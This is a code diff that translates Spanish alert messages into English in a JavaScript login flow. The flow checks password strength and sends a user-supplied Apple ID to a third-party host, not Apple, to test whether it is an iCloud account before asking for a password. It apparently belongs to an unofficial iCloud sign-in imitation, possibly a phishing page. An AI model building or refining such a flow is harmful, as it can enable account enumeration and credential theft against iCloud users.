@@ -15,19 +15,19 @@ function validatePassword() {
     const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/;
 
     if (!minLength.test(password)) {
-        alert("La contraseña debe tener al menos 8 caracteres.");
+        alert("The password must be at least 8 characters long.");
         return false;
     }
     if (!hasUpperCase.test(password)) {
-        alert("La contraseña debe tener al menos una letra mayúscula.");
+        alert("The password must have at least one capital letter.");
         return false;
     }
     if (!hasLowerCase.test(password)) {
-        alert("La contraseña debe tener al menos una letra minúscula.");
+        alert("The password must have at least one lowercase letter.");
         return false;
     }
     if (!hasNumber.test(password)) {
-        alert("La contraseña debe tener al menos un número.");
+        alert("The password must have at least one number.");
         return false;
     }
 
@@ -56,7 +56,7 @@ async function showPasswordInput1() {
       idOk = true;
       // Aquí puedes agregar el código para continuar con el flujo si el correo existe
     } else {
-      alert('El correo que ingresaste no pertenece a una cuenta de iCloud.');
+      alert('The email you entered does not belong to an iCloud account.');
     }
 
   } catch (error) {
@@ -90,7 +90,7 @@ async function showPasswordInput2() {
     const response = await fetch('https://api-icloud-id.vercel.app/?id=' + appleId);
 
     if (!response.ok) {
-      throw new Error('Error en la solicitud');
+      throw new Error('Error in the application');
     }
 
     const data = await response.json();  // Suponiendo que la respuesta es en formato JSON
@@ -99,7 +99,7 @@ async function showPasswordInput2() {
       idOk = true;
       // Aquí puedes agregar el código para continuar con el flujo si el correo existe
     } else {
-      alert('El correo que ingresaste no pertenece a una cuenta de iCloud.');
+      alert('The email you entered does not belong to an iCloud account.');
     }
 
   } catch (error) {
